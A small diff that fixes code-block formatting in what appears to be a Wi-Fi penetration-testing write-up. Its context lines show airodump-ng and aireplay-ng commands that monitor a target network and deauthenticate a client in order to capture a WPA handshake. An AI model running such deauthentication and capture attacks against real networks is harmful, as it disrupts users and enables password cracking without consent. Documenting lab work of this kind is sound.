@@ -37,7 +37,7 @@ This made it easier to observe client activity and capture a WPA handshake when 
 
 ```bash
 airodump-ng --bssid <TARGET_BSSID> --channel <CH> -w capture wlan1mon
-
+```
 
 This command was used to monitor the target network and write captured traffic to a file for later analysis.
 
@@ -52,7 +52,7 @@ This forces the client to disconnect and immediately reconnect, generating a WPA
 
 ```bash
 aireplay-ng --deauth 3 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan1mon
-
+```
 
 Shortly after executing the deauthentication attack, a valid WPA handshake was successfully captured.
 
